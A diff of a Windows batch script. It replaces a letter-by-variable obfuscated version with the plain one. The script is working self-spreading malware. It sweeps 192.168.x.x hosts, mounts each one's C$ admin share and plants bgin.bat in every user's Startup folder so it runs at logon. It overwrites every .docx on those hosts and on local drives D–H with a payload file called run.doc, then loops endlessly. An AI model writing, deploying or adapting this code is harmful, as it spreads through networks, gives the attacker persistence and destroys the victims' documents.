@@ -1,56 +1,30 @@
 @echo off
-set aa=a
-set aaa=b
-set aaaa=c
-set aaaaa=d
-set aaaaaa=e
-set aaaaaaa=f
-set aaaaaaaa=g
-set aaaaaaaaa=h
-set aaaaaaaaaa=i
-set aaaaaaaaaaa=j
-set aaaaaaaaaaaa=k
-set aaaaaaaaaaaaa=l
-set aaaaaaaaaaaaaa=m
-set aaaaaaaaaaaaaaa=n
-set aaaaaaaaaaaaaaaa=o
-set aaaaaaaaaaaaaaaaa=p
-set aaaaaaaaaaaaaaaaaa=q
-set aaaaaaaaaaaaaaaaaaa=r
-set aaaaaaaaaaaaaaaaaaaa=s
-set aaaaaaaaaaaaaaaaaaaaa=t
-set aaaaaaaaaaaaaaaaaaaaaa=u
-set aaaaaaaaaaaaaaaaaaaaaaa=v
-set aaaaaaaaaaaaaaaaaaaaaaaa=w
-set aaaaaaaaaaaaaaaaaaaaaaaaa=x
-set aaaaaaaaaaaaaaaaaaaaaaaaaa=y
-set aaaaaaaaaaaaaaaaaaaaaaaaaaa=z
-%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaa%=1
-%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%=0
-:%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%
-%aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%: \\192.168.%%aaaaaaaaaa%%.%%aaaaaaaaaa%%aaaaaaaaaa%%\%aaaa%$
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% %%%aaaaaaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%:\%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% "%aaaaaaaaaaaaaaaaaaaaaaaaa%:\%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%%%aaaaaaaaaaaaaaaaaaaaaaaaa%\%aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaa%\%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%"
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% %%%aaaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%:\%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaa%%aaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%" "%aaaaaaaaaaaaaaaaaaaaaaaaa%:\%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%%%aaaaaaaaaaaaaaaaaaaaaa%\%aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaa%\%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%\%aaa%%aaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%"
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaaaaaaaaaaaaaaaaaaaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaaaaaaaaaaaaaaaaaaaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaa%: /%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%)))
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaa%%aaaaaaa% %aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaa%: (%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaa% "%aaaaa%%aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%=" %%%aaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% ('%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% %aaaaaaaaa%:\*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa% /%aaa%') %aaaaa%%aaaaaaaaaaaaaaaa% %aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaaaaaaa% "%aaaa%:\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%" "%aaaaaaaaa%:\%%%aaaaaaaaa%"
-%aaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaa% "%aaaaaaaaa%:" %%%aaaaaaa% %aaaaaaaaaa%%aaaaaaaaaaaaaaa% (*.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%) %aaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa% "%%%aaaaaaa%" *.%aaaaa%%aaaaaaaaaaaaaaaa%%aaaa%
-%aaaaaaaaaa%%aaaaaaa% %%aaaaaaaaaa%%aaaaaaaaaa%% == 256 (%aaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%) %aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa% (%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aa% %aaaaaaaaaa%%aaaaaaaaaa%=%aaaaaaaaaa%%aaaaaaaaaa%+1)
-%aaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%
-:%aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%
-%aaaaaaaaaa%%aaaaaaa% %%aaaaaaaaaa%% == 256 (%aaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%) %aaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa% (%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aa% %aaaaaaaaaa%=%aaaaaaaaaa%+1)
-%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaa%=1
-%aaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%
-:%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%
-%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%=0
-%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaa%%aaaaaaaaaa%=1
-%aaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%
+SET ii=1
+SET i=0
+:run
+net use X: \\192.168.%i%.%ii%\C$
+if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
+net use X: /delete)))
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
+for /R "D:" %%f in (*.docx) do ren "%%f" *.doc
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
+for /R "E:" %%f in (*.docx) do ren "%%f" *.doc
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
+for /R "F:" %%f in (*.docx) do ren "%%f" *.doc
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
+for /R "G:" %%f in (*.docx) do ren "%%f" *.doc
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
+for /R "H:" %%f in (*.docx) do ren "%%f" *.doc
+if %ii% == 256 (goto next) else (set /a ii=ii+1)
+goto run
+:next
+if %i% == 256 (goto reset) else (set /a i=i+1)
+SET ii=1
+goto run
+:reset
+SET i=0
+SET ii=1
+goto run
